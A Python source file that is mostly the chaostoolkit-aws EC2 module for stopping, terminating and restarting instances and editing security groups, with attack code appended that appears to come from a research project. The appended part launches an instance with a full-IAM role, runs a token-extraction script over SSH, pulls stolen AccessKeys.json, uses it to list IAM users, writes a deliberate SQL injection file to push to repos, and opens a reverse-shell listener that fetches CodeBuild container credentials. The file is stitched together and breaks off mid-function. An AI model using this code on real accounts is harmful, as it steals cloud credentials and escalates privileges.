import random
import time
from collections import defaultdict
from copy import deepcopy
from typing import Any, Dict, List, Union

import boto3
import json
import os
import paramiko

from botocore.exceptions import ClientError
from chaoslib.exceptions import ActivityFailed, FailedActivity
from chaoslib.types import Configuration, Secrets

from chaosaws import (
    aws_client,
    convert_tags,
    get_logger,
    tags_as_key_value_pairs,
)
from chaosaws.types import AWSResponse

__all__ = [
    "stop_instance",
    "stop_instances",
    "terminate_instances",
    "terminate_instance",
    "start_instances",
    "restart_instances",
    "detach_random_volume",
    "attach_volume",
    "stop_instances_by_incremental_steps",
    "set_tags_on_instances",
    "remove_tags_from_instances",
]

logger = get_logger()


def stop_instance(
    instance_id: str = None,
    az: str = None,
    force: bool = False,
    filters: List[Dict[str, Any]] = None,
    configuration: Configuration = None,
    secrets: Secrets = None,
) -> List[AWSResponse]:
    """
    Stop a single EC2 instance.

    You may provide an instance id explicitly or, if you only specify the AZ,
    a random instance will be selected. If you need more control, you can
    also provide a list of filters following the documentation
    https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/ec2.html#EC2.Client.describe_instances
    """

    if not az and not instance_id and not filters:
        raise FailedActivity(
            "To stop an EC2 instance, you must specify either the instance id,"
            " an AZ to pick a random instance from, or a set of filters."
        )

    if az and not instance_id and not filters:
        logger.warning(
            "Based on configuration provided I am going to "
            "stop a random instance in AZ %s!" % az
        )

    client = aws_client("ec2", configuration, secrets)

    if not instance_id:
        filters = deepcopy(filters) if filters else []

        if az:
            filters.append({"Name": "availability-zone", "Values": [az]})
        instance_types = pick_random_instance(filters, client)

        if not instance_types:
            raise FailedActivity(f"No instances in availability zone: {az}")
    else:
        instance_types = get_instance_type_by_id([instance_id], client)

    logger.debug(
        f"Picked EC2 instance '{instance_types}' from AZ '{az}' to be stopped"
    )

    return stop_instances_any_type(
        instance_types=instance_types, force=force, client=client
    )


def stop_instances(
    instance_ids: List[str] = None,
    az: str = None,
    filters: List[Dict[str, Any]] = None,
    force: bool = False,
    configuration: Configuration = None,
    secrets: Secrets = None,
) -> List[AWSResponse]:
    """
    Stop the given EC2 instances or, if none is provided, all instances
    of the given availability zone. If you need more control, you can
    also provide a list of filters following the documentation
    https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/ec2.html#EC2.Client.describe_instances
    """

    if not az and not instance_ids and not filters:
        raise FailedActivity(
            "To stop EC2 instances, you must specify either the instance ids,"
            " an AZ to pick random instances from, or a set of filters."
        )

    if az and not instance_ids and not filters:
        logger.warning(
            "Based on configuration provided I am going to "
            "stop all instances in AZ %s!" % az
        )

    client = aws_client("ec2", configuration, secrets)

    if not instance_ids:
        filters = deepcopy(filters) if filters else []

        if az:
            filters.append({"Name": "availability-zone", "Values": [az]})
        instance_types = list_instances_by_type(filters, client)

        if not instance_types:
            raise FailedActivity(f"No instances in availability zone: {az}")
    else:
        instance_types = get_instance_type_by_id(instance_ids, client)

    logger.debug(
        "Picked EC2 instances '{}' from AZ '{}' to be stopped".format(
            str(instance_types), az
        )
    )

    return stop_instances_any_type(
        instance_types=instance_types, force=force, client=client
    )


def terminate_instance(
    instance_id: str = None,
    az: str = None,
    filters: List[Dict[str, Any]] = None,
    configuration: Configuration = None,
    secrets: Secrets = None,
) -> List[AWSResponse]:
    """
    Terminates a single EC2 instance.

    An instance may be targeted by specifying it by instance-id. If only the
    availability-zone is provided, a random instances in that AZ will be
    selected and terminated. For more control, please reference the available
    filters found:
    https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/ec2.html#EC2.Client.describe_instances
    """

    if not any([instance_id, az, filters]):
        raise FailedActivity(
            "To terminate an EC2, you must specify the "
            "instance-id, an Availability Zone, or provide a "
            "set of filters"
        )

    if az and not any([instance_id, filters]):
        logger.warning(
            "Based on configuration provided I am going to "
            "terminate a random instance in AZ %s!" % az
        )

    client = aws_client("ec2", configuration, secrets)
    if not instance_id:
        filters = deepcopy(filters) or []

        if az:
            filters.append({"Name": "availability-zone", "Values": [az]})
            logger.debug("Looking for instances in AZ: %s" % az)

        # Randomly select an instance
        instance_types = pick_random_instance(filters, client)

        if not instance_types:
            raise FailedActivity(
                "No instances found matching filters: %s" % str(filters)
            )

        logger.debug("Instance selected: %s" % str(instance_types))
    else:
        instance_types = get_instance_type_by_id([instance_id], client)

    return terminate_instances_any_type(instance_types, client)


def terminate_instances(
    instance_ids: List[str] = None,
    az: str = None,
    filters: List[Dict[str, Any]] = None,
    configuration: Configuration = None,
    secrets: Secrets = None,
) -> List[AWSResponse]:
    """
    Terminates multiple EC2 instances

    A set of instances may be targeted by providing them as the instance-ids.

    WARNING: If  only an Availability Zone is specified, all instances in
    that AZ will be terminated.

    Additional filters may be used to narrow the scope:
    https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/ec2.html#EC2.Client.describe_instances
    """
    if not any([instance_ids, az, filters]):
        raise FailedActivity(
            "To terminate instances, you must specify the "
            "instance-id, an Availability Zone, or provide a "
            "set of filters"
        )

    if az and not any([instance_ids, filters]):
        logger.warning(
            "Based on configuration provided I am going to "
            "terminate all instances in AZ %s!" % az
        )

    client = aws_client("ec2", configuration, secrets)
    if not instance_ids:
        filters = deepcopy(filters) or []

        if az:
            filters.append({"Name": "availability-zone", "Values": [az]})
            logger.debug("Looking for instances in AZ: %s" % az)

        # Select instances based on filters
        instance_types = list_instances_by_type(filters, client)

        if not instance_types:
            raise FailedActivity(
                "No instances found matching filters: %s" % str(filters)
            )

        logger.debug(f"Instances in AZ {az} selected: {str(instance_types)}}}.")
    else:
        instance_types = get_instance_type_by_id(instance_ids, client)

    return terminate_instances_any_type(instance_types, client)


def start_instances(
    instance_ids: List[str] = None,
    az: str = None,
    filters: List[Dict[str, Any]] = None,
    configuration: Configuration = None,
    secrets: Secrets = None,
) -> List[AWSResponse]:
    """
    Starts one or more EC2 instances.

    WARNING: If only an Availability Zone is provided, all instances in the
    provided AZ will be started.

    Additional filters may be used to narrow the scope:
    https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/ec2.html#EC2.Client.describe_instances
    """
    if not any([instance_ids, az, filters]):
        raise FailedActivity(
            "To start instances, you must specify the "
            "instance-id, an Availability Zone, or provide a "
            "set of filters"
        )

    if az and not any([instance_ids, filters]):
        logger.warning(
            "Based on configuration provided I am going to "
            "start all instances in AZ %s!" % az
        )

    client = aws_client("ec2", configuration, secrets)

    if not instance_ids:
        filters = deepcopy(filters) or []

        if az:
            filters.append({"Name": "availability-zone", "Values": [az]})
            logger.debug("Looking for instances in AZ: %s" % az)

        # Select instances based on filters
        instance_types = list_instances_by_type(filters, client)

        if not instance_types:
            raise FailedActivity(
                "No instances found matching filters: %s" % str(filters)
            )

        logger.debug(f"Instances in AZ {az} selected: {str(instance_types)}}}.")
    else:
        instance_types = get_instance_type_by_id(instance_ids, client)
    return start_instances_any_type(instance_types, client)


def restart_instances(
    instance_ids: List[str] = None,
    az: str = None,
    filters: List[Dict[str, Any]] = None,
    configuration: Configuration = None,
    secrets: Secrets = None,
) -> List[AWSResponse]:
    """
    Restarts one or more EC2 instances.

    WARNING: If only an Availability Zone is provided, all instances in the
    provided AZ will be restarted.

    Additional filters may be used to narrow the scope:
    https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/ec2.html#EC2.Client.describe_instances
    """
    if not any([instance_ids, az, filters]):
        raise FailedActivity(
            "To restart instances, you must specify the "
            "instance-id, an Availability Zone, or provide a "
            "set of filters"
        )

    if az and not any([instance_ids, filters]):
        logger.warning(
            "Based on configuration provided I am going to "
            "restart all instances in AZ %s!" % az
        )

    client = aws_client("ec2", configuration, secrets)

    if not instance_ids:
        filters = deepcopy(filters) or []

        if az:
            filters.append({"Name": "availability-zone", "Values": [az]})
            logger.debug("Looking for instances in AZ: %s" % az)

        # Select instances based on filters
        instance_types = list_instances_by_type(filters, client)

        if not instance_types:
            raise FailedActivity(
                "No instances found matching filters: %s" % str(filters)
            )

        logger.debug(f"Instances in AZ {az} selected: {str(instance_types)}}}.")
    else:
        instance_types = get_instance_type_by_id(instance_ids, client)
    return restart_instances_any_type(instance_types, client)


def detach_random_volume(
    instance_ids: List[str] = None,
    filters: List[Dict[str, Any]] = None,
    force: bool = True,
    configuration: Configuration = None,
    secrets: Secrets = None,
) -> List[AWSResponse]:
    """
    Detaches a random ebs volume (non root) from one or more EC2 instances

    Parameters:
        One of:
            instance_ids: a list of one or more ec2 instance ids
            filters: a list of key/value pairs to pull ec2 instances

        force: force detach volume (default: true)

    Additional filters may be used to narrow the scope:
    https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/ec2.html#EC2.Client.describe_instances
    """
    if not any([instance_ids, filters]):
        raise FailedActivity(
            "To detach volumes, you must specify the "
            "instance_id or provide a set of filters"
        )

    client = aws_client("ec2", configuration, secrets)

    if not instance_ids:
        filters = deepcopy(filters) or []
        instances = list_instance_volumes(client, filters=filters)
    else:
        instances = list_instance_volumes(client, instance_ids=instance_ids)

    results = []
    for e in instances:
        results.append(detach_instance_volume(client, force, e))
    return results


def attach_volume(
    instance_ids: List[str] = None,
    filters: List[Dict[str, Any]] = None,
    configuration: Configuration = None,
    secrets: Secrets = None,
) -> List[AWSResponse]:
    """
    Attaches a previously detached EBS volume to its associated EC2 instance.

    If neither 'instance_ids' or 'filters' are provided, all detached volumes
    will be reattached to their respective instances

    Parameters:
        One of:
            instance_ids: list: instance ids
            filters: list: key/value pairs to pull ec2 instances
    """
    client = aws_client("ec2", configuration, secrets)

    if not instance_ids and not filters:
        instances = []
    elif not instance_ids and filters:
        filters = deepcopy(filters) or []
        instances = list_instances(client, filters=filters)
    else:
        instances = list_instances(client, instance_ids=instance_ids)

    volumes = get_detached_volumes(client)
    results = []
    for volume in volumes:
        for t in volume["Tags"]:
            if t["Key"] != "ChaosToolkitDetached":
                continue
            attach_data = t["Value"].split(";")
            device_name = attach_data[0].split("=")[-1]
            instance_id = attach_data[1].split("=")[-1]

            if not instances or instance_id in [
                e["InstanceId"] for e in instances
            ]:
                results.append(
                    attach_instance_volume(
                        client, instance_id, volume["VolumeId"], device_name
                    )
                )
    return results


def stop_instances_by_incremental_steps(
    volume: int,
    step_quantity: int,
    step_duration: int,
    az: str = None,
    tags: Union[str, Dict[str, Any]] = None,
    force: bool = False,
    configuration: Configuration = None,
    secrets: Secrets = None,
) -> List[AWSResponse]:
    """
    Stop a volume of instances incrementally by steps.

    The steps are using two dimensions, the duration between two iterations
    and the number of instances to stop on each iteration.

    The `tags` can be specified as a key=value pair dictionary or a comma
    separated list of k=v pairs. They are good to be set when you want to
    target only a certain subset of instances. Likewise for the
    availability-zone.
    """
    client = aws_client("ec2", configuration, secrets)

    filters = []

    tags = convert_tags(tags) if tags else []

    if tags:
        filters.append(tags)

    if az:
        filters.append({"Name": "availability-zone", "Values": [az]})

    instances = list_instances_by_type(filters, client)

    if not instances:
        raise FailedActivity(f"No instances in availability zone: {az}")

    logger.debug(
        "Picked EC2 instances '{}' from AZ '{}' to be stopped".format(
            str(instances), az
        )
    )

    total = len(instances)
    count = round(total * volume / 100)
    target_instances = random.sample(instances, count)

    responses = []
    while target_instances:
        stop_these_instances_now = target_instances[:step_quantity]
        target_instances = target_instances[step_quantity:]

        responses.extend(
            stop_instances_any_type(
                instance_types=stop_these_instances_now,
                force=force,
                client=client,
            )
        )

        pause_for_a_while(step_duration)

    return responses


def set_tags_on_instances(
    tags: Union[str, List[Dict[str, str]]],
    percentage: int = 100,
    az: str = None,
    filters: List[Dict[str, Any]] = None,
    configuration: Configuration = None,
    secrets: Secrets = None,
) -> AWSResponse:
    """
    Sets some tags on the instances matching the `filters`. The set of instances
    may be filtered down by availability-zone too.

    The `tags`can be passed as a dictionary of key, value pair respecting
    the usual AWS form: [{"Key": "...", "Value": "..."}, ...] or as a string
    of key value pairs such as "k1=v1,k2=v2"

    The `percentage` parameter (between 0 and 100) allows you to select only a
    certain amount of instances amongst those matching the filters.

    If no filters are given and `percentage` remains to 100, the entire set
    of instances in an AZ will be tagged. If no AZ is provided, your entire
    set of instances in the region will be tagged. This can be a lot of
    instances and would not be appropriate. Always to use the filters to
    target a significant subset.

    See also: https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/ec2/client/create_tags.html
    """  # noqa E501
    client = aws_client("ec2", configuration, secrets)

    if isinstance(tags, str):
        tags = tags_as_key_value_pairs(convert_tags(tags) if tags else [])

    if not tags:
        raise FailedActivity("Missing tags to be set")

    filters = filters or []
    if az:
        filters.append({"Name": "availability-zone", "Values": [az]})

    instances = list_instances_by_type(filters, client)

    instance_ids = [inst_id for inst_id in instances.get("normal", [])]

    total = len(instance_ids)
    # always force at least one instance
    count = max(1, round(total * percentage / 100))
    target_instances = random.sample(instance_ids, count)

    if not target_instances:
        raise FailedActivity(f"No instances in availability zone: {az}")

    logger.debug(
        "Picked EC2 instances '{}' from AZ '{}'".format(
            str(target_instances), az
        )
    )

    response = client.create_tags(Resources=target_instances, Tags=tags)

    return response


def remove_tags_from_instances(
    tags: Union[str, List[Dict[str, str]]],
    az: str = None,
    configuration: Configuration = None,
    secrets: Secrets = None,
) -> AWSResponse:
    """
    Remove tags from instances

    Usually mirrors `set_tags_on_instances`.
    """
    client = aws_client("ec2", configuration, secrets)

    if isinstance(tags, str):
        tags = tags_as_key_value_pairs(convert_tags(tags) if tags else [])

    filters = []
    for tag in tags:
        filters.append({"Name": f"tag:{tag['Key']}", "Values": [tag["Value"]]})

    if az:
        filters.append({"Name": "availability-zone", "Values": [az]})

    instances = client.describe_instances(Filters=filters)

    instance_ids = []
    for reservation in instances["Reservations"]:
        for inst in reservation["Instances"]:
            instance_ids.append(inst["InstanceId"])

    logger.debug(
        "Found EC2 instances '{}' from AZ '{}'".format(str(instance_ids), az)
    )

    response = client.delete_tags(Resources=instance_ids, Tags=tags)

    return response


###############################################################################
# Private functions
###############################################################################
def pause_for_a_while(duration: int) -> None:
    time.sleep(float(duration))


def list_instances_by_type(
    filters: List[Dict[str, Any]], client: boto3.client
) -> Dict[str, Any]:
    """
    Return all instance ids matching the given filters by type
    (InstanceLifecycle) ie spot, on demand, etc.
    """
    logger.debug(f"EC2 instances query: {str(filters)}")
    res = client.describe_instances(Filters=filters)
    logger.debug(f"Instances matching the filter query: {str(res)}")

    return get_instance_type_from_response(res)


def list_instances(
    client: boto3.client,
    filters: List[Dict[str, Any]] = None,
    instance_ids: List[str] = None,
) -> List[Dict[str, Any]]:
    """
    Return all instance ids matching either the filters or provided list of ids

    Does not group instances by type
    """
    if filters:
        params = dict(Filters=filters)
    else:
        params = dict(InstanceIds=instance_ids)

    results = []
    response = client.describe_instances(**params)["Reservations"]
    for r in response:
        for e in r["Instances"]:
            results.append(e)
    return results


def list_instance_volumes(
    client: boto3.client,
    instance_ids: List[str] = None,
    filters: List[Dict[str, Any]] = None,
) -> List[AWSResponse]:
    """
    Return all (non root) instance volumes for instances matching either
    the provided filters or instance ids (do not group by type)
    """
    if filters:
        params = dict(Filters=filters)
    else:
        params = dict(InstanceIds=instance_ids)

    response = client.describe_instances(**params)["Reservations"]

    if not response:
        raise FailedActivity("no instances found matching: %s" % str(params))

    results = {}
    for r in response:
        for e in r["Instances"]:
            instance_id = e["InstanceId"]
            bdm = e.get("BlockDeviceMappings", [])
            for b in bdm:
                if b["DeviceName"] in ("/dev/sda1", "/dev/xvda"):
                    continue
                results.setdefault(instance_id, []).append(
                    {b["DeviceName"]: b["Ebs"]["VolumeId"]}
                )

    volumes = []
    for r in results:
        # select 1 volume at random
        volume = random.sample(results[r], 1)[0]
        for k, v in volume.items():
            volumes.append({"InstanceId": r, "DeviceName": k, "VolumeId": v})
    return volumes


def pick_random_instance(
    filters: List[Dict[str, Any]], client: boto3.client
) -> Union[str, dict, None]:
    """
    Select an instance at random based on the returned list of instances
    matching the given filter.
    """
    instances_type = list_instances_by_type(filters, client)
    if not instances_type:
        return

    random_id = random.choice(
        [item for sublist in instances_type.values() for item in sublist]
    )

    for k, v in instances_type.items():
        if random_id in v:
            return {k: [random_id]}


def get_instance_type_from_response(response: Dict) -> Dict:
    """
    Transform list of instance IDs to a dict with IDs by instance type
    """
    instances_type = defaultdict(list)
    # reservations are instances that were started together

    for reservation in response["Reservations"]:
        for inst in reservation["Instances"]:
            # when this field is missing, we assume "normal"
            # which means On-Demand or Reserved
            # this seems what the last line of the docs imply at
            # https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-purchasing-options.html
            lifecycle = inst.get("InstanceLifecycle", "normal")

            if lifecycle not in instances_type.keys():
                # adding empty list (value) for new instance type (key)
                instances_type[lifecycle] = []

            instances_type[lifecycle].append(inst["InstanceId"])

    return instances_type


def get_spot_request_ids_from_response(response: Dict) -> List[str]:
    """
    Return list of all spot request ids from AWS response object
    (DescribeInstances)
    """
    spot_request_ids = []

    for reservation in response["Reservations"]:
        for inst in reservation["Instances"]:
            # when this field is missing, we assume "normal"
            # which means On-Demand or Reserved
            lifecycle = inst.get("InstanceLifecycle", "normal")

            if lifecycle == "spot":
                spot_request_ids.append(inst["SpotInstanceRequestId"])

    return spot_request_ids


def get_instance_type_by_id(
    instance_ids: List[str], client: boto3.client
) -> Dict:
    """
    Return dict object with instance ids grouped by instance types
    """
    res = client.describe_instances(InstanceIds=instance_ids)

    return get_instance_type_from_response(res)


def stop_instances_any_type(
    instance_types: dict = None,
    force: bool = False,
    client: boto3.client = None,
) -> List[AWSResponse]:
    """
    Stop instances regardless of the instance type (on demand, spot)
    """

    response = []
    if "normal" in instance_types:
        logger.debug("Stopping instances: {}".format(instance_types["normal"]))

        response.append(
            client.stop_instances(
                InstanceIds=instance_types["normal"], Force=force
            )
        )

    if "spot" in instance_types:
        # TODO: proper support for spot fleets
        # https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/spot-fleet.html

        # To properly stop spot instances have to cancel spot requests first
        spot_request_ids = get_spot_request_ids_from_response(
            client.describe_instances(InstanceIds=instance_types["spot"])
        )

        logger.debug(f"Canceling spot requests: {spot_request_ids}")
        client.cancel_spot_instance_requests(
            SpotInstanceRequestIds=spot_request_ids
        )
        logger.debug(
            "Terminating spot instances: {}".format(instance_types["spot"])
        )

        response.append(
            client.terminate_instances(InstanceIds=instance_types["spot"])
        )

    if "scheduled" in instance_types:
        # TODO: add support for scheduled instances
        # https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-scheduled-instances.html
        raise FailedActivity("Scheduled instances support is not implemented")
    return response


def terminate_instances_any_type(
    instance_types: dict = None, client: boto3.client = None
) -> List[AWSResponse]:
    """
    Terminates instance(s) regardless of type
    """
    response = []

    for k, v in instance_types.items():
        logger.debug(f"Terminating {k} instance(s): {instance_types[k]}")
        if k == "spot":
            instances = get_spot_request_ids_from_response(
                client.describe_instances(InstanceIds=v)
            )
            # Cancel spot request prior to termination
            client.cancel_spot_instance_requests(
                SpotInstanceRequestIds=instances
            )
            response.append(client.terminate_instances(InstanceIds=v))
            continue
        response.append(client.terminate_instances(InstanceIds=v))
    return response


def start_instances_any_type(
    instance_types: dict, client: boto3.client
) -> List[AWSResponse]:
    """
    Starts one or more instances regardless of type
    """
    results = []
    for k, v in instance_types.items():
        logger.debug(f"Starting {k} instance(s): {v}")
        response = client.start_instances(InstanceIds=v)
        results.extend(response.get("StartingInstances", []))
    return results


def restart_instances_any_type(instance_types: dict, client: boto3.client):
    """
    Restarts one or more instances regardless of type
    """
    results = []
    for k, v in instance_types.items():
        logger.debug(f"Restarting {k} instance(s): {v}")
        client.reboot_instances(InstanceIds=v)
    return results


def detach_instance_volume(
    client: boto3.client, force: bool, volume: Dict[str, str]
) -> AWSResponse:
    """
    Detach volume from an instance
    """
    try:
        response = client.detach_volume(
            Device=volume["DeviceName"],
            InstanceId=volume["InstanceId"],
            VolumeId=volume["VolumeId"],
            Force=force,
        )

        # tag volume with instance information (to reattach on rollback)
        client.create_tags(
            Resources=[volume["VolumeId"]],
            Tags=[
                {
                    "Key": "ChaosToolkitDetached",
                    "Value": "DeviceName=%s;InstanceId=%s"
                    % (volume["DeviceName"], volume["InstanceId"]),
                }
            ],
        )
        return response
    except ClientError as e:
        raise FailedActivity(
            "unable to detach volume %s from %s: %s"
            % (
                volume["VolumeId"],
                volume["InstanceId"],
                e.response["Error"]["Message"],
            )
        )


def get_detached_volumes(client: boto3.client):
    results = []
    paginator = client.get_paginator("describe_volumes")
    for p in paginator.paginate(
        Filters=[{"Name": "tag-key", "Values": ["ChaosToolkitDetached"]}]
    ):
        for v in p["Volumes"]:
            results.append(v)
    return results


def attach_instance_volume(
    client: boto3.client, instance_id: str, volume_id: str, mount_point: str
) -> AWSResponse:
    try:
        response = client.attach_volume(
            Device=mount_point, InstanceId=instance_id, VolumeId=volume_id
        )
        logger.debug(f"Attached volume {volume_id} to instance {instance_id}")
    except ClientError as e:
        raise FailedActivity(
            "Unable to attach volume %s to instance %s: %s"
            % (volume_id, instance_id, e.response["Error"]["Message"])
        )
    return response


def authorize_security_group_ingress(
    requested_security_group_id: str,
    ip_protocol: str,
    from_port: int,
    to_port: int,
    ingress_security_group_id: str = None,
    cidr_ip: str = None,
    configuration: Configuration = None,
    secrets: Secrets = None,
) -> AWSResponse:
    """
    Add one ingress rule to a security group
    https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/ec2.html#EC2.Client.authorize_security_group_ingress

    - requested_security_group_id: the id for the security group to update
    - ip_protocol: ip protocol name (tcp, udp, icmp, icmpv6) or -1 to specify all
    - from_port: start of port range
    - to_port: end of port range
    - ingress_security_group_id: id of the securiy group to allow access to. You can either specify this or cidr_ip.
    - cidr_ip: the IPv6 CIDR range.
    You can either specify this or ingress_security_group_id
    """  # noqa: E501
    client = aws_client("ec2", configuration, secrets)
    request_kwargs = create_ingress_kwargs(
        requested_security_group_id,
        ip_protocol,
        from_port,
        to_port,
        ingress_security_group_id,
        cidr_ip,
    )
    try:
        response = client.authorize_security_group_ingress(**request_kwargs)
        return response
    except ClientError as e:
        raise ActivityFailed(
            "Failed to add ingress rule: {}".format(
                e.response["Error"]["Message"]
            )
        )


def revoke_security_group_ingress(
    requested_security_group_id: str,
    ip_protocol: str,
    from_port: int,
    to_port: int,
    ingress_security_group_id: str = None,
    cidr_ip: str = None,
    configuration: Configuration = None,
    secrets: Secrets = None,
) -> AWSResponse:
    """
    Remove one ingress rule from a security group
    https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/ec2.html#EC2.Client.revoke_security_group_ingress

    - requested_security_group_id: the id for the security group to update
    - ip_protocol: ip protocol name (tcp, udp, icmp, icmpv6) or -1 to specify all
    - from_port: start of port range
    - to_port: end of port range
    - ingress_security_group_id: id of the securiy group to allow access to. You can either specify this or cidr_ip.
    - cidr_ip: the IPv6 CIDR range. You can either specify this or ingress_security_group_id
    """  # noqa: E501
    client = aws_client("ec2", configuration, secrets)
    request_kwargs = create_ingress_kwargs(
        requested_security_group_id,
        ip_protocol,
        from_port,
        to_port,
        ingress_security_group_id,
        cidr_ip,
    )
    try:
        response = client.revoke_security_group_ingress(**request_kwargs)
        return response
    except ClientError as e:
        raise ActivityFailed(
            "Failed to remove ingress rule: {}".format(
                e.response["Error"]["Message"]
            )
        )


def create_ingress_kwargs(
    requested_security_group_id: str,
    ip_protocol: str,
    from_port: int,
    to_port: int,
    ingress_security_group_id: str = None,
    cidr_ip: str = None,
) -> Dict[str, any]:
    request_kwargs = {
        "GroupId": requested_security_group_id,
        "IpPermissions": [
            {
                "IpProtocol": ip_protocol,
                "IpRanges": [
                    {
                        # conditionally assign the following
                        # 'CidrIp': cidr_ip
                    }
                ],
                "FromPort": from_port,
                "ToPort": to_port,
                "UserIdGroupPairs": [
                    {
                        # conditionally assign the following
                        # 'GroupId': ingress_security_group_id
                    }
                ],
            }
        ],
    }
    req = request_kwargs["IpPermissions"][0]
    if cidr_ip is not None:
        req["IpRanges"][0]["CidrIp"] = cidr_ip
    if ingress_security_group_id is not None:
        req["UserIdGroupPairs"][0]["GroupId"] = ingress_security_group_id
    return request_kwargs

def get_session(sett, access, secret, token=None):
    try:
        if sett == "Vulnerable":
            sess = boto3.session.Session(
                region_name="us-east-1",
                aws_access_key_id=access,
                aws_secret_access_key=secret)
            
        elif sett == "Attacker":
            sess = boto3.session.Session(
                region_name="us-east-1",
                aws_access_key_id=access,
                aws_secret_access_key=secret,
                aws_session_token = token)
        else:
            sess = boto3.session.Session(region_name="us-east-1")

        return sess

    except Exception as e:
        print(f"Error: couldn't create a session. Details: {e}")



def extract_credentials():
    ssh = paramiko.SSHClient()
    print("-----Connecting to aws instance-----")
    k = paramiko.RSAKey.from_private_key_file("demo-ec2.pem")
    # OR k = paramiko.DSSKey.from_private_key_file(keyfilename)

    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    hostname1 = get_latest_instance_hostname()

    print("hostname: " + hostname1)

    ssh.connect(hostname=hostname1, username="ec2-user", pkey=k)
    sftp = ssh.open_sftp()
    print("-----Getting token-----")
    sftp.put("actions/extract_token.py","/home/ec2-user/extract_token.py") 


    command = "python3 extract_token.py"
    try:
        ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(command)

    except Exception as e:
        return f"Failed to extract credentials: Error {e}"
    print("SUCCESS!")
    stdout = []
    for line in ssh_stdout:
        stdout.append(line.strip())

    stderr = []
    for line in ssh_stderr:
        stderr.append(line.strip())

    #print("out:",stdout) 
    #print("err: ",stderr) 
    print("-----Storing credentials-----")
    sftp.get("/home/ec2-user/AccessKeys.json", "./AccessKeys.json") 
            
    # Clean up elements
    sftp.close()
    ssh.close()
    del ssh, ssh_stdin, ssh_stdout, ssh_stderr
    return stdout

def priv_scalation(keys):
    f = open(keys)
    new_keys = json.load(f)
    f.close()#cambiar a with open(file)
    access = new_keys["AccessKeyId"]
    secret = new_keys["SecretAccessKey"]
    token = new_keys["Token"]
    print("-----Reading new credentials-----")
    try:
        sess = get_session("Attacker", access,secret,token)
        print("SUCCESS!")
        client = sess.client('iam')
        lista = client.list_users(MaxItems=2)['Users']
        print('Users')
        for usuario in lista[1:]:
            print(f"- Arn: {usuario['Arn']}")
            print(f"  CreateDate: {str(usuario['CreateDate'])}")
            print(f"  PasswordLastUsed: {str(usuario['PasswordLastUsed'])}")
            print(f"  Path: {usuario['Path']}")
            print(f"  UserID: {usuario['UserId']}")
            print(f"  UserName: {usuario['UserName']}")



        return True
    except Exception as e:
        print(f"couldn't connect using new credentials: {e}")
        return False

    


def create_instance():
    #secretos del usuario vulnerable
    access = ""
    secret = ""
    sess =  get_session('Vulnerable', access, secret)
    client = sess.resource('ec2')
    cli = sess.client('ec2')
    print("Creando instsncia....")
    instancia = client.create_instances(ImageId="ami-02f3f602d23f1659d",
                                        InstanceType="t2.micro",
                                        IamInstanceProfile={"Name": "iamfullaccess"},
                                        KeyName="demo-ec2",
                                        SecurityGroupIds=['sg-03d1a24ec4f2f11fe'],
                                        MaxCount=1,
                                        MinCount=1,
                                        )
    print("Instancia creada correctamente: ",instancia[0].id)

    #instancia[0].wait_until_running()
    print("wait until running")
    time.sleep(60)

    public_ip = instancia[0].public_ip_address
    public_dns = instancia[0].public_dns_name
    print(instancia[0].security_groups)
    print(public_ip)
    print(public_dns)

    return instancia

def get_latest_instance_hostname():
    ec2 = boto3.client('ec2')
    response = ec2.describe_instances(
        Filters=[
            {
                'Name': 'instance-state-name',
                'Values': ['pending', 'running']
            }
        ],
        MaxResults=5
    )
    
    if response['Reservations']:
        instance = response['Reservations'][0]['Instances'][0]
        return instance.get('PublicDnsName')
    return None

def create_vuln_file():
    
    if os.path.exists("vulnerable_file.py"):
        return

    vulnerable_code = """def get_transaction_by_origin(id_origin):
        query = f"SELECT * FROM transactions WHERE id >= {id_origin};"
        conn.execute(query)
        return conn.fetchall()
    """

    with open("vulnerable_file.py", "w") as file:
        file.write(vulnerable_code)


import requests
from git import Repo
import shutil
import os

def push_file(repo_path, commit_message):
    
    try:
        repo = Repo(repo_path)

        if commit_message == 'Experiment-5-CodeGuru':

            source = '/home/mmc/Universidad/CDL/ChaosXploit/Runner/vulnerable_file.py'
            destination = '/home/mmc/Universidad/CDL/Experiment-5-CodeGuru/'
            shutil.copy(source, destination)
            repo.git.add('vulnerable_file.py')

        elif commit_message == "Experiment-4-CodeBuild":

            source = '/home/mmc/Universidad/CDL/ChaosXploit/Runner'
            destination = '/home/mmc/Universidad/CDL/Experiment-4-CodeBuild/'
            shutil.copy(source, destination)
            repo.git.add('buildspec.yml')
        
        repo.index.commit(commit_message)
        origin = repo.remote(name='origin')
        origin.push('main')
        
        return True
    except Exception as e:
        print(f"Error: {str(e)}")
        return False

import socket
import re

def clean_access_keys_file():
    
    input_file = "AccessKeys.json"
    
    try:
        with open(input_file, "r") as file:
            content = file.read()

        # Buscar el bloque JSON dentro del contenido usando una expresión regular
        match = re.search(r"\{.*\}", content, re.DOTALL)
        if match:
            json_content = match.group(0)
            with open(input_file, "w") as file:
                file.write(json_content)
    except FileNotFoundError:
        print("[!] AccessKeys.json file does not exist.")
    except Exception as e:
        print(f"[!] Error cleaning the file: {e}")

def extract_credentials_codebuild():
    # IP y puerto en los que el script escuchará la conexión inversa
    host = '0.0.0.0'
    port = 12345

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)
    print(f"[+] Listening on {host}:{port}...")

    client_socket, client_address = server_socket.accept()

    # Enviar el comando para que se ejecute en la reverse shell
    comando = "curl $AWS_CONTAINER_CREDENTIALS_FULL_URI\n"
    client_socket.sendall(comando.encode('utf-8'))

    # Leer y guardar la salida en AccessKeys.json hasta que se lea el carácter '}'
    try:
        with open("AccessKeys.json", "w") as file:
            buffer = ""
            while True:
                data = client_socket.recv(4096)
                if not data:
                    break
                decoded_data = data.decode('utf-8', errors='ignore')
